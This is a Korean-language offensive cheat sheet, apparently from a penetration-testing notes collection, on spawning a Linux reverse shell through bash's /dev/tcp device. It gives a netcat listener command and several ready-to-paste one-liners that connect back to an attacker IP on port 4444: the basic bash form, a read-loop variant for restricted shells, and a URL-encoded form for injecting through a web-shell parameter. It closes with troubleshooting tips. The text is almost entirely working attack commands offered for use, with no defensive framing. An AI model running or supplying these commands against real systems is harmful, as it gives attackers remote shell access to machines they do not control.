# Linux Bash 리버스 셸

- bash의 `/dev/tcp` 의사 장치로 표준 입출력을 소켓에 물려 리스너에 콜백하는 Linux 기본 리버스 셸 원라이너. 별도 도구 없이 bash 한 줄로 연결된다.
- 타깃에서 명령 실행 지점(웹셸·RCE)을 확보했고 bash가 있는 게 확인됐을 때 가장 먼저 시도하는 표준 1순위 원라이너다.
- 타깃에 bash 필요(dash·ash는 /dev/tcp 미지원), 공격자 리스너가 먼저 떠 있어야 하고, 타깃에서 공격자 IP로 TCP 아웃바운드가 허용돼야 한다.

## 리스너 준비 (공격자)

```bash
nc -lvnp 4444
```

- `-l` listen, `-v` verbose, `-n` DNS 조회 생략, `-p 4444` 포트. 리스너를 먼저 띄운 뒤 타깃 원라이너를 실행한다.

## 기본 원라이너 (타깃)

```bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

- `bash -i`: 대화형 셸.
- `>& /dev/tcp/IP/PORT`: stdout·stderr를 소켓으로 보낸다. `/dev/tcp`는 파일이 아니라 bash가 내부적으로 여는 TCP 소켓이다.
- 끝의 `0>&1`: stdin을 stdout(=소켓)으로 돌린다. 이 리다이렉션이 빠지면 연결은 되지만 명령을 못 받는다.

## bash가 아니 sh(dash)로만 실행되는 환경

```bash
# /bin/sh가 dash인 시스템은 이렇게 bash를 직접 호출
/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

## 최소 환경용 read 루프

```bash
exec 5<>/dev/tcp/10.10.10.10/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
```

- `bash -i`가 안 붙는 제한된 환경(인자 검열 등)에서 쓴다. fd 5를 소켓으로 열어 한 줄씩 읽어 실행한다.
- 대화형은 아니지만 명령 실행은 된다. 연결 후 shells/shell-upgrade/python_pty.md로 안정화한다.

## URL·인코딩 형태 (웹셸 파라미터로 넣을 때)

```bash
# URL 인코딩이 필요한 위치에서 (공백 -> %20, > -> %3E, & -> %26)
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.10%2F4444%200%3E%261
```

- 파이프나 쿼리스트링에 그대로 넣으면 `&`가 셸 제어 문자로 먼저 해석되어 실패한다. 인용부호로 감싸거나 인코딩한다.

## 확인과 전환

```bash
# 타깃에서 bash 존재 확인
which bash
ls -la /bin/bash /bin/sh
# dash/ash뿐이면 perl·python 버전으로 전환
which perl python python3
```

## 트러블슈팅

- 연결이 아예 안 오면 아웃바운드(타깃 → 공격자 4444)가 막혀 있거나 리스너가 안 떠 있는 것이다. 리스너를 먼저, 방화벽 확인을 나중에.
- 연결은 되는데 명령이 안 먹히면 `0>&1`이 빠진 것이다. 원라이너를 통째로 다시 붙여넣는다.
- `bash: line 1: syntax error`가 반복되면 sh(dash)에서 실행한 것이다. `/dev/tcp`는 bash 전용이라 dash에서는 파일도 안 열린다.
- 셸이 열렸는데 ctrl+c를 누르면 연결이 끊긴다. 안정화가 필요하면 shells/shell-upgrade/python_pty.md 절차를 따른다.
